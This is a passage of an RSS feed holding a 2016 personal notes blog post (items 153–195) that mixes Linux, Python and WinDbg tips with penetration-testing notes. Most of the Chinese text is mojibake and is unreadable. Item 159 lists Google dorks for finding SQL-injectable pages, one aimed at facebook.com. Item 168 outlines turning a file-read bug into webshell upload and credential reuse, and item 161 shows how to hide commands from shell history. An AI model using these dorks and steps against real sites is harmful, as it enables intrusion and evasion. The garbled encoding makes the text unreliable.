    rm -rf .config/apps/compiz*
    rm -rf .cache/compizconfig-1
    rm -rf .config/compiz-1
    rm -rf .compiz
    
    æœ¬æœºå‡ºç°çª—å£æ²¡æœ‰&quot;å…³é—­,æœ€å°åŒ–&quot;ç­‰è§£å†³æ–¹æ³•:
        æ‰“å¼€compizè®¾ç½®åœ¨çª—å£ç®¡ç†å¤„å‹¾é€‰&quot;æ”¾ç½®çª—å£&quot;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;153.&lt;/span&gt;linuxæ¸…ç†:
    1&amp;gt;apt-get autoremove
    2&amp;gt;apt-get autoclean
    3&amp;gt;apt-get clean
    4&amp;gt;dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P(ä¸€é”®åˆ é™¤æ®‹ä½™é…ç½®æ–‡ä»¶)
&lt;span class=&quot;p&quot;&gt;154.&lt;/span&gt;ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
&lt;span class=&quot;p&quot;&gt;155.&lt;/span&gt;ubuntu 16.04 super+dåˆ‡æ¢åˆ°æ¡Œé¢çš„æ–¹æ³•,åœ¨ç³»ç»Ÿçš„é”®ç›˜è®¾ç½®ä¸­å–æ¶ˆå¯¼èˆªä¸­çš„éšè—æ‰€æœ‰çª—å£çš„super+dçš„å¿«æ·é”®,æ‰“å¼€compizconfig settins manager,æœç´¢unity,æ‰¾åˆ°æ˜¾ç¤ºæ¡Œé¢çš„å¿«æ·é”®è®¾ç½®å¤„,è®¾ç½®ä¸ºsuper+d
&lt;span class=&quot;p&quot;&gt;156.&lt;/span&gt;pip install exp10it -Uå‡ºç°æ— æ³•ç«‹åˆ»å‡çº§å¤„ç†åŠæ³•:pip install exp10it=(local_latest_version)
&lt;span class=&quot;p&quot;&gt;157.&lt;/span&gt;grepå¤šè¡ŒåŒ¹é…:(eg.åŒ¹é…exp10it.pyä¸­çš„api)
    pcregrep -M &#39;def .&lt;span class=&quot;ge&quot;&gt;*(.*&lt;/span&gt;):&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;(.&lt;span class=&quot;ge&quot;&gt;*#.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;){1,10}&#39;
&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linuxä¸‹vmwareä¸­æœ‰ä¸€å°æœºå™¨æ­¢ä½å¯¼è‡´å…¶ä»–è™šæ‹Ÿæœºä¹Ÿæ— æ³•è¿›å…¥è§£å†³æ–¹æ³•:
    ps -aux | grep &quot;vmware&quot;
    kill pid_of_error_machine
&lt;span class=&quot;p&quot;&gt;159.&lt;/span&gt;google dock:
    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
    inurl:&quot;php&quot;|&quot;php page=&quot;|&quot;php id=&quot;|&quot;php tid=&quot;|&quot;php pid=&quot;|&quot;php cid=&quot;|&quot;php path=&quot;|&quot;php cmd=&quot;|&quot;php file=&quot;|&quot;php cartId=&quot;|&quot;php bookid=&quot;|&quot;php num=&quot;|&quot;php idProduct=&quot;|&quot;php ProdId=&quot;|&quot;php idCategory=&quot;|&quot;php intProdID=&quot;|&quot;cfm storeid=&quot;|&quot;php catid=&quot;|&quot;php cart_id=&quot;|&quot;php order_id=&quot;|&quot;php catalogid=&quot;|&quot;php item=&quot;|&quot;php title=&quot;|&quot;php CategoryID=&quot;|&quot;php action=&quot;|&quot;php newsID=&quot;|&quot;php newsid=&quot;|&quot;php product_id=&quot;|&quot;php cat=&quot;|&quot;php parent_id=&quot;|&quot;php view=&quot;|&quot;php itemid=&quot; site:www.facebook.com
    site:xxx.xxx.xxx inurl:union select
    site:xxx.xxx.xxx intext:warning|error|syntax|incorrect|unexpected|occurred|command|execute
&lt;span class=&quot;p&quot;&gt;160.&lt;/span&gt;my own github&#39;s md file:
    æ¯è¡Œ111ä¸ªå­—èŠ‚é•¿åº¦,ä½†æ˜¯å†™mdæ—¶å¹¶ä¸ç”¨åœ¨vimä¸­è®¾ç½®111ä¸ªå­—èŠ‚é•¿åº¦åè‡ªåŠ¨æ¢è¡Œ,å› ä¸ºmdæ–‡ä»¶ä¼šåœ¨åº”è¯¥æ¢è¡Œçš„æ—¶å€™è‡ªåŠ¨æ¢è¡Œ,åªè¦å°†ä¸€æ®µçš„å†…å®¹å†™åˆ°mdæ–‡ä»¶ä¸­çš„ä¸€è¡Œä¸­å³å¯
&lt;span class=&quot;p&quot;&gt;161.&lt;/span&gt;echo $HISTCONTROL,å¦‚æœç»“æœä¸ºignoreboth,æ‰§è¡Œå‘½ä»¤æ—¶å…ˆåŠ ç©ºæ ¼å†è¾“å…¥å‘½ä»¤åˆ™historyä¸ä¼šè®°å½•
&lt;span class=&quot;p&quot;&gt;162.&lt;/span&gt;github-pages ä½¿ç”¨å¤šè¯´
    http://www.ituring.com.cn/article/114888
&lt;span class=&quot;p&quot;&gt;163.&lt;/span&gt;windbgè°ƒè¯•å‘½ä»¤è¯¦è§£:
    http://www.yiiyee.cn/Blog/windbg/
    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
    db esi:æŸ¥çœ‹esiåœ°å€ä¸­çš„å†…å®¹
        db 400000:æŸ¥çœ‹0x400000å¤„çš„å†…å®¹,dbæŒ‰å­—èŠ‚å¤§å°æŸ¥çœ‹,ddæŒ‰DWORDç±»å‹æŸ¥çœ‹
    !address edi:æ˜¾ç¤ºediåœ°å€å¤„çš„å†…å­˜çŠ¶æ€,ä¿¡æ¯
    lmm mso v:åŒ¹é…msoæ¨¡å—,å¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
    bp eax:åœ¨eaxå¤„ä¸‹æ–­ç‚¹,æ”¯æŒç¬¬å‡ æ¬¡ç»è¿‡åä¸­æ–­,æ”¯æŒä¸­æ–­åæ‰§è¡Œå‘½ä»¤
    g:è®©è¢«è°ƒè¯•çš„ç¨‹åºç»§ç»­è¿è¡Œ(f5)
        gh:æŠŠå¼‚å¸¸æ ‡è¯†ä¸ºå·²å¤„ç†å¹¶æ–­ç»­æ‰§è¡Œç¨‹åº
        go:å¯¹å¼‚å¸¸ä¸è¿›è¡Œä»»ä½•å¤„ç†å¹¶ç»§ç»­æ‰§è¡Œç¨‹åº
    kb:æ˜¾ç¤ºä¼ é€’ç»™å †æ ˆå›æº¯ä¸­çš„æ¯ä¸ªå‡½æ•°çš„å‰ä¸‰ä¸ªå‚æ•°
        kp:æ˜¾ç¤ºä¼ é€’ç»™å †æ ˆå›æº¯ä¸­çš„æ¯ä¸ªå‡½æ•°çš„æ‰€æœ‰å‚æ•°
    ub mso!Ordinal1273+0x2581:åæ±‡ç¼–mso!Ordinal1273+0x2581åœ°å€ä¹‹å‰çš„ä»£ç 
        uf test!main:åæ±‡ç¼–test!mainå‡½æ•°
    p:å•æ­¥æ­¥å…¥step into(f11)
    t:å•æ­¥æ­¥è¿‡step over(f10)
    ? ebp-edi:æ˜¾ç¤ºè¡¨è¾¾å¼ebp-ediçš„å€¼
        ?? expression:æ˜¾ç¤ºc++è¡¨è¾¾å¼çš„å€¼
    .cls:æ¸…å±
&lt;span class=&quot;p&quot;&gt;164.&lt;/span&gt;firefoxå¥½ç”¨çš„ä¸€ä¸ªç¿»è¯‘é™„åŠ ç»„ä»¶:
    S3.Google Translator
&lt;span class=&quot;p&quot;&gt;165.&lt;/span&gt;firefoxçš„vimperatoræ’ä»¶ä½¿ç”¨:
    http://wangbixi.com/x2923/comment-page-1/
    http://pchu.blogbus.com/
    http://luoxiqofy.blogbus.com
    http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html
&lt;span class=&quot;p&quot;&gt;166.&lt;/span&gt;æ¶æ„æ–‡æ¡£åˆ†ææŠ€å·§åŠå·¥å…·å¿«é€Ÿå‚è€ƒ
    http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq
&lt;span class=&quot;p&quot;&gt;167.&lt;/span&gt;ubuntuå®‰è£…java
    http://www.linuxdiyf.com/linux/21071.html
&lt;span class=&quot;p&quot;&gt;168.&lt;/span&gt;æ–‡ä»¶ä¸‹è½½æˆ–æ–‡ä»¶è¯»å–æ¼æ´æ€è·¯:
    1&amp;gt;è¯»æ•°æ®åº“è¿æ¥æ–‡ä»¶
    2&amp;gt;å°è¯•è¿æ¥æ•°æ®åº“
        a&amp;gt;æ˜¯å¦æ”¯æŒæ•°æ®åº“å¤–è¿
        b&amp;gt;æ˜¯å¦æœ‰phpmyadmin(æ‰«ç›®å½•)
            select ... into dumpfile ...
                å¦‚æœä¸çŸ¥é“å†™shellè·¯å¾„,å¯ä»phpmyadminä¸­æ‰¾æ‰¾æ•°æ®åº“ä¸­å­˜åœ¨çš„è·¯å¾„,å®æˆ˜ä¸­æ‰¾åˆ°è¿‡phpmyadminçš„webé¡µé¢çš„è·¯å¾„
            å¦‚æœä¸èƒ½å†™æ–‡ä»¶åˆ™é€šè¿‡æŸ¥çœ‹æ•°æ®åº“ä¸­çš„ç®¡ç†å‘˜ç”¨æˆ·åå¯†ç è¿›åå°ä¸Šä¼ shell
            æˆ–è€…ç”¨æ•°æ®åº“ä¸­çš„å…¶ä»–å¯†ç å°è¯•è¿æ¥ftp
            æˆ–è€…å¦‚æœæ•°æ®åº“ä¸­æœ‰editorçš„setting,ä¿®æ”¹ä¸ºå¯ä»¥ä¸Šä¼ php
    3&amp;gt;å°è¯•è¯»å–åˆ°ftpé…ç½®æ–‡ä»¶,å°è¯•ç”¨æ•°æ®åº“ç”¨æˆ·åå¯†ç è¿æ¥ftp
    4&amp;gt;ä»£ç å®¡è®¡
&lt;span class=&quot;p&quot;&gt;169.&lt;/span&gt;www.gnu.orgä¸Šå¯ä»¥ä¸‹è½½linuxç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·,eg.findå·¥å…·
&lt;span class=&quot;p&quot;&gt;170.&lt;/span&gt;discuzæ¼æ´æ‰«æå·¥å…·
    dzscan
    https://github.com/code-scan/dzscan
&lt;span class=&quot;p&quot;&gt;171.&lt;/span&gt;windbgä¸­æ‰¾ä¸åˆ°symbolè·¯å¾„è§£å†³æ–¹æ³•:
    .sympath srv&lt;span class=&quot;ge&quot;&gt;*c:symbols*&lt;/span&gt;http://msdl.microsoft.com/download/symbols
    .reload /f
&lt;span class=&quot;p&quot;&gt;172.&lt;/span&gt;ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹è¯»ä¹¦å‚ç…§
    http://wdxtub.com/2016/04/16/thin-csapp-0/
    http://www.voidcn.com/blog/zym0017d/article/p-540879.html
&lt;span class=&quot;p&quot;&gt;173.&lt;/span&gt;å®ç”¨çš„æœç´¢å¼•æ“
    http://kaopu.so/
&lt;span class=&quot;p&quot;&gt;174.&lt;/span&gt;awkå®ç”¨æŒ‡å—
    http://awk.readthedocs.io/en/latest/chapter-one.html
&lt;span class=&quot;p&quot;&gt;175.&lt;/span&gt;ssrfç›¸å…³
    http://evilcos.me/?p=221
&lt;span class=&quot;p&quot;&gt;176.&lt;/span&gt;findæŸ¥æ‰¾æœ€è¿‘çš„æ–‡ä»¶:
    find / -amin -10 # æŸ¥æ‰¾åœ¨ç³»ç»Ÿä¸­æœ€å10åˆ†é’Ÿè®¿é—®çš„æ–‡ä»¶
    find / -atime -2 # æŸ¥æ‰¾åœ¨ç³»ç»Ÿä¸­æœ€å48å°æ—¶è®¿é—®çš„æ–‡ä»¶
    
    find / -mmin -5 # æŸ¥æ‰¾åœ¨ç³»ç»Ÿä¸­æœ€å5åˆ†é’Ÿé‡Œä¿®æ”¹è¿‡çš„æ–‡ä»¶
    find / -mtime -1 #æŸ¥æ‰¾åœ¨ç³»ç»Ÿä¸­æœ€å24å°æ—¶é‡Œä¿®æ”¹è¿‡çš„æ–‡ä»¶76
&lt;span class=&quot;p&quot;&gt;177.&lt;/span&gt;phpæ•°ç»„é”®å€¼å¯¹
    http://www.cnblogs.com/coderchuanyu/p/3904711.html
&lt;span class=&quot;p&quot;&gt;178.&lt;/span&gt;å¿«é€ŸæŸ¥çœ‹webshellå¤§é©¬æ˜¯å¦å«æœ‰åé—¨:
    firebug|ç½‘ç»œ,å¦‚æœçœ‹åˆ°è®¿é—®å¤§é©¬æ—¶è¿˜æœ‰å…¶ä»–å¯ç–‘è®¿é—®uri,è¯´æ˜æœ‰åé—¨
&lt;span class=&quot;p&quot;&gt;179.&lt;/span&gt;pycæ–‡ä»¶ç›¸å½“äºpyhtonæ–‡ä»¶çš„ç¼“å­˜,å¦‚æœimportäº†æŸä¸ªæ¨¡å—ååœ¨ç›®å½•ä¸‹ç”Ÿæˆäº†pycæ–‡ä»¶,å°±ç®—è¿™ä¸ªåˆšæ‰è¢«importçš„pyæ¨¡å—è¢«åˆ 
    é™¤äº†,ä½†æ˜¯ç”±äºpycæ–‡ä»¶è¿˜å­˜åœ¨,ä»ç„¶å¯ä»¥import è¯¥æ¨¡å—
&lt;span class=&quot;p&quot;&gt;180.&lt;/span&gt;pythonæŸ¥çœ‹æ¨¡å—ä¸­æœ‰å“ªäº›å‡½æ•°(dir()ç”¨æ³•)
    http://www.iplaypython.com/jichu/dir.html
&lt;span class=&quot;p&quot;&gt;181.&lt;/span&gt;pythonå¤šçº¿ç¨‹ä¸­ä½¿ç”¨multiprocessing.poolå‚æ•°ä¸ºå¤šä¸ªçš„ä½¿ç”¨æ–¹æ³•
    http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map&lt;span class=&quot;sb&quot;&gt;

    from multiprocessing.dummy import Pool as ThreadPool
    pool=ThreadPool(20)
    ä½¿ç”¨mapå’Œmap_async:
        pool.map() vs pool.map_async
        mapæ˜¯é˜»å¡çš„,è¦ç­‰åˆ°mapé‡Œé¢çš„åˆ—è¡¨ä¸­çš„æ‰€æœ‰
        ç›¸åº”æ–‡æ¡£:
            https://docs.python.org/2/library/multiprocessing.html(è‹±æ–‡)
            http://python.usyiyi.cn/translate/python_278/library/index.html(ä¸­æ–‡)
            ä¸­æ–‡ä¸è¯¦å°½,è‹±æ–‡ä¸­è¯´åˆ°multiprocessing.dummyå°±æ˜¯multiprocessingçš„å¤åˆ¶ç‰ˆæœ¬,åªä¸è¿‡multiprocessing.dummy
            ä½œç”¨äºçº¿ç¨‹
            &quot;multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around
            the threading module.&quot;
            æ‰€ä»¥å‚è€ƒmultiprocessingçš„apiæ¥ä½¿ç”¨æ“ä½œçº¿ç¨‹æ± å³å¯

            https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html

            pool.close()
                é˜²æ­¢ä»»ä½•æ›´å¤šçš„ä»»åŠ¡(å…¶ä»–æ²¡æœ‰å®‰æ’è¿‡çš„ä»»åŠ¡,mapè¿‡çš„ä»»åŠ¡ä¸å±äºè¿™ä¸ªèŒƒå›´)è¢«æäº¤åˆ°çº¿ç¨‹æ± ä¸­.ä¸€æ—¦æ‰€æœ‰çš„ä»»
                åŠ¡å·²ç»å®Œæˆäº†å·¥ä½œçº¿ç¨‹å°†é€€å‡º.
            pool.terminate()
                ç«‹å³åœæ­¢çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹(æ— è®ºä»»åŠ¡æœ‰æ²¡æœ‰å®Œæˆ),ç»æµ‹è¯•å¹¶ä¸èƒ½åœæ­¢æ‰€æœ‰çš„çº¿ç¨‹æ± ä¸­è¦è¿›è¡Œçš„ä»»åŠ¡,åº”è¯¥
                æ˜¯åªèƒ½åœæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä¸€ä¸ªå‡½æ•°è¿‡ç¨‹(å­çº¿ç¨‹)

                ä¸ºäº†åœæ­¢çº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰çº¿ç¨‹,å°¤å…¶æ˜¯åœ¨çˆ†ç ´å¯†ç æ—¶,æŸä¸€ä¸ªçº¿ç¨‹å·²ç»çˆ†ç ´æˆåŠŸ,ä¸ºäº†è¾¾åˆ°&quot;åœæ­¢å…¶ä»–çš„å°†è¦æ‰§
                è¡Œçš„é€šè¿‡mapåŠ å…¥åˆ°poolçº¿ç¨‹æ± ä¸­çš„ä»»åŠ¡&quot;ç›¸åŒçš„æ•ˆæœ,åœ¨æ¯ä¸ªçº¿ç¨‹ä¸­çš„å¼€å¤´åˆ¤æ–­æ˜¯å¦å·²ç»çˆ†ç ´æˆåŠŸ,æˆåŠŸåˆ™ç›´
                æ¥return,ä¸æˆåŠŸåˆ™ç»§ç»­æœ¬çº¿ç¨‹åº”è¯¥å®Œæˆçš„å·¥ä½œ
            pool.join()
                ç­‰å¾…çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹é€€å‡º,å¿…é¡»å…ˆä½¿ç”¨pool.close()æˆ–è€…pool.terminate()æ‰èƒ½è°ƒç”¨join()

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;182.&lt;/span&gt;cmsåœ¨çº¿è¯†åˆ«
    http://whatweb.bugscaner.com/
&lt;span class=&quot;p&quot;&gt;183.&lt;/span&gt;Netifera(åŸŸåˆ†æç¥å™¨)
&lt;span class=&quot;p&quot;&gt;184.&lt;/span&gt;æ¸—é€å›¾
    http://images0.cnblogs.com/blog2015/640760/201506/121255389739630.png
    http://www.e-wolf.top/content/uploadfile/201608/0f9f1471011328.jpg
&lt;span class=&quot;p&quot;&gt;185.&lt;/span&gt;pythonå‡½æ•°åµŒå¥—æ—¶åœ¨å†…å±‚å‡½æ•°ä¸­æ“ä½œå¤–å±‚å‡½æ•°çš„å˜é‡,ä¸ä½¿ç”¨å…¨å±€å˜é‡çš„æ–¹æ³•
    http://www.crifan.com/python_access_parent_nesting_function_local_variable_from_nested_function/
&lt;span class=&quot;p&quot;&gt;186.&lt;/span&gt;pythonä½¿ç”¨mechanizeè¿›è¡Œwebäº¤äº’(å¯åˆ—è¡¨å•,å¡«è¡¨å•,æäº¤è¡¨å•,ä½¿ç”¨ä»£ç†ç­‰å¾ˆæ–¹ä¾¿)
    http://blog.csdn.net/jeanphorn/article/details/46917159
    http://blog.chinaunix.net/uid-26722078-id-3507409.html
&lt;span class=&quot;p&quot;&gt;187.&lt;/span&gt;pythonæ˜¾ç¤ºè¿›åº¦æ¡æ–¹æ³•
    http://www.111cn.net/phper/python/66812.htm
&lt;span class=&quot;p&quot;&gt;188.&lt;/span&gt;pythonä¸­httpsè®¿é—®è®¤è¯å¤±è´¥è§£å†³æ–¹æ³•:
    http://bookshadow.com/weblog/2015/04/22/sae-python-weibo-sdk-certificate-verify-failed/
&lt;span class=&quot;p&quot;&gt;189.&lt;/span&gt;pythonä¸­sys.stdoutæ¨¡å—
    http://www.cnblogs.com/turtle-fly/p/3280519.html
    a. print &quot;something&quot;   ç›¸å½“äºsys.stdout.write(&quot;something&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&quot;)
    b. print &quot;something&quot;,  ç›¸å½“äºsys.stdout.write(&quot;something&quot;)&lt;span class=&quot;sb&quot;&gt;

    æ²¡æœ‰æ¢è¡Œçš„printæˆ–sys.stdout.write()éƒ½ä¸ä¼šç«‹å³æ‰“å°å‡ºæ¥,éœ€è¦é‡åˆ°æœ‰æ¢è¡Œçš„åœ°æ–¹æ‰ä¼šæ˜¾ç¤º,æˆ–è€…æ²¡æœ‰é‡åˆ°æ¢è¡Œåªèƒ½åœ¨
    ç¨‹åºè¿è¡Œç»“æŸåå¼ºåˆ¶æ˜¾ç¤º,ä¹Ÿå³bä¸­çš„æ–¹æ³•ä¸ä¼šæ‰“å°å‡ºå†…å®¹åˆ°ç»ˆç«¯,åŠ sys.stdout.flush()æ‰å¯ä»¥é©¬ä¸Šæ˜¾ç¤º,æˆ–è€…é‡åˆ°ä¸‹é¢çš„
    printæœ‰æ¢è¡ŒåŠŸèƒ½,æˆ–è€…ç¨‹åºç»“æŸæ‰ä¼šæ‰“å°å‡ºæ¥
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;190.&lt;/span&gt;æŸ¥çœ‹pythonæ¨¡å—æ–‡æ¡£
        python -m pydoc -p 500
    pythonå®˜æ–¹æ–‡æ¡£ä¸­æ–‡ç«™
        http://python.usyiyi.cn/translate/python_278/library/index.html
    pythonå®˜æ–¹è‹±æ–‡æ–‡æ¡£
        https://docs.python.org/2.7/&lt;span class=&quot;sb&quot;&gt;

    ä¸Šé¢ä¸èƒ½æŸ¥çœ‹åˆ°çš„ä¿¡æ¯,eg. sys.stdoutæœ‰å“ªäº›å‡½æ•°?æ–¹æ³•å¦‚ä¸‹:
        python
        import sys
        dir(sys.stdout)
        sys.stdout.__doc__
            å¯ä»¥çœ‹å‡ºsys.stdoutæ˜¯ä¸ªæ–‡ä»¶å¯¹è±¡
            æ–‡ä»¶å¯¹è±¡çš„æ“ä½œhttp://my.oschina.net/u/2252538/blog/332757
        sys.stdout.truncate.__doc__
        sys.stdout.close.__doc__
        ...
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;191.&lt;/span&gt;å¿«é€ŸæŸ¥çœ‹windowsæ˜¯32|64ä½
    dxdiag
&lt;span class=&quot;p&quot;&gt;192.&lt;/span&gt;pythonåœ¨ä¸€è¡Œæ‰“å°çš„æ–¹æ³•
    eg.
    PASSWORD=password+(50-len(password))&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&quot; &quot;
    sys.stdout.write(&#39;-&#39;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;&amp;gt;&#39;+str(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;%&#39;+&#39; %s/%s %s&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&#39; % &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;
    (try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,PASSWORD))
    sys.stdout.flush()
    å…¶ä¸­passwordé•¿åº¦æ˜¯å˜åŒ–çš„,ä½¿ç”¨print &quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;æˆ–sys.stdout.write(&quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;)æƒ³è¾¾åˆ°é€€æ ¼çš„æ•ˆæœæ— æœå,è€ƒè™‘åˆ°çš„æŠ€å·§:å£°æ˜å¥½
    ä¸€ä¸ªå°¾éƒ¨æ˜¯ç©ºæ ¼ä¸²çš„PASSWORD,å°†åŠ¨æ€å˜åŒ–çš„passwordæ”¾å…¥PASSWORDçš„æœ€å‰é¢,è¿™æ ·å°±æ˜¯æ¯æ¬¡åœ¨åŒä¸€è¡Œæ‰“å°é•¿åº¦ä¸å˜çš„å­—ç¬¦
    ä¸²äº†,å°±ä¸ä¼šç”±äºpasswordç”±é•¿å˜çŸ­åçªå‡ºçš„é•¿çš„å°¾å·´ä¸èƒ½ç”¨é€€æ ¼æ¸…é™¤è€Œçƒ¦æ¼äº†
&lt;span class=&quot;p&quot;&gt;193.&lt;/span&gt;pythonä¸­æ‰“å¼€æ–‡ä»¶å¯ä»¥ç”¨with open() fçš„æ–¹å¼æ¥æ‰“å¼€æ–‡ä»¶:
        with open(r&#39;user.dic&#39;, &#39;r&#39;) as fUser:  # ä½¿ç”¨with as æ¥æ‰“å¼€æ–‡ä»¶,ä¸éœ€è‡ªå·±å…³é—­æ–‡ä»¶,å› ä¸ºä»–ä¼šè‡ªå·±åœ¨åˆé€‚çš„æ—¶
        å€™è‡ªå·²å…³é—­(ç±»ä¼¼C# ä¸­çš„using(...){}æ¥å£)
&lt;span class=&quot;p&quot;&gt;194.&lt;/span&gt;windowsä¸‹batå¯¹æŒ‡å®šæ—¥æœŸå†…çš„æ–‡ä»¶çš„æ“ä½œ
    http://www.111cn.net/sys/Windows7/81187.htm
&lt;span class=&quot;p&quot;&gt;195.&lt;/span&gt;cssä¸­åŠ è½½æœ¬åœ°ä¸å­˜åœ¨çš„å¤–éƒ¨å­—ä½“æ—¶,ç”¨@font-face,@font-faceè¦å†™åœ¨cssæ–‡ä»¶çš„å¼€å¤´(å…¨å±€å¯ç”¨)çš„ä½ç½®,ä¸èƒ½å†™åœ¨å±€éƒ¨çš„
    csså±æ€§é‡Œé¢

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 07 Aug 2016 00:00:00 +0800</pubDate>
        <link>/auxilary/2016/08/07/my-notes/</link>
        <guid isPermaLink="true">/auxilary/2016/08/07/my-notes/</guid>
        
        <category>experience</category>
        
        <category>study</category>
        
        
        <category>auxilary</category>
        
      </item>
    
  </channel>
</rss>
